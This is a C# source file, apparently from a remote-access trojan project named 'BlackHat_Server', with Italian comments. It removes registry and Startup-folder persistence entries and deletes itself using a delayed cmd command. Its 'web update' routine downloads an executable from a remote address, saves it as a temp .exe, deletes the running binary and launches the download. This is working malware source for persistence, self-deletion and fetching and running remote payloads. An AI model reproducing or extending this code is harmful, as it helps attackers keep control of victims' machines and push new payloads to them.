using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace BlackHat_Server
{
    class ServerAgent
    {
        
        /// <summary>
        /// Disinstalla il server
        /// onlyDelete: se true è solo disinstallzione, altrimenti non elimina se stesso (uso per update from web)
        /// </summary>
        public void UninstallServer(bool onlyDelete)
        {
            RegistryManager rm = new RegistryManager();

            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            string adppDataFilePath = Path.Combine(appData, ST_Client.Instance.sAppDataInstall);

            
            
            // ELIMINO I REGISTRY DELLE INSTALLAZIONi
            if (ST_Client.Instance.bUseHKCU)
                rm.RemoveHKCUReg(ST_Client.Instance.sHKCUEntry, adppDataFilePath);

            if (ST_Client.Instance.bUseExplorer)
                rm.RemoveExplorerReg(ST_Client.Instance.sExplorerEntry, adppDataFilePath);

            // ELIMINAZIONE FILE
            if (ST_Client.Instance.bUseHKCU || ST_Client.Instance.bUseExplorer)
            {
                if (File.Exists(adppDataFilePath) && Application.ExecutablePath != adppDataFilePath)                
                    File.Delete(adppDataFilePath);                  
                
                   
            }
            


            if (ST_Client.Instance.bUseStartupFolder)
            {
                string startup = Environment.GetFolderPath(Environment.SpecialFolder.Startup);

                string fileToDel = Path.Combine(startup,ST_Client.Instance.sStartupFileName);

                if (File.Exists(fileToDel) && Application.ExecutablePath != fileToDel)
                    File.Delete(fileToDel);   

               
            }

            

            // NUOVO PROCESSO CMD PER ELIMINAZIONE DEL FILE IN ESECUZIONE!

            if (onlyDelete)
            {
                InstallClass ic = new InstallClass();
                ic.DeleteMySelf();
            }

            // L'APP è STATA CHIUSA DA DELETEMYSELF
            
            
        }
        //--------------------------

        /// <summary>
        /// Avvio thread di update server
        /// </summary>
        /// <param name="webAddress"></param>
        public void StartUpdateServerWeb(string webAddress)
        {
            new Thread(delegate()
            {
                ServerWebUpdater(webAddress);
            }).Start();
        }
        //---------------------------

        /// <summary>
        /// Thread di update server da web
        /// </summary>
        /// <param name="webAddress"></param>
        private void ServerWebUpdater(string webAddress)
        {
           
            try
            {
                string tmpFilePath = Path.GetTempFileName();

                tmpFilePath = Path.ChangeExtension(tmpFilePath, ".exe"); // lo faccio diventare un exe
                

                WebClient wc = new WebClient();
                wc.DownloadFile(webAddress, tmpFilePath); // scarico il file nel tmp

                UninstallServer(false); // CANCELLO TUTTA L'INSTALLAZIONE MA NON L'ESEGUIBILE

                // SOSTITUISCO L'ESEGUIBILE E MI RIESEGUO!

                string arg = string.Format("/C choice /C Y /N /D Y /T 9 & Del \"{0}\" & \"{1}\"  ", Application.ExecutablePath, tmpFilePath);

                DosRunner dr = new DosRunner();                

                dr.RunDosSelfDelete(arg);              
               

                Application.Exit();
            }
            catch 
            {
                
            }

           



        }
        //-------------------------

    }
}
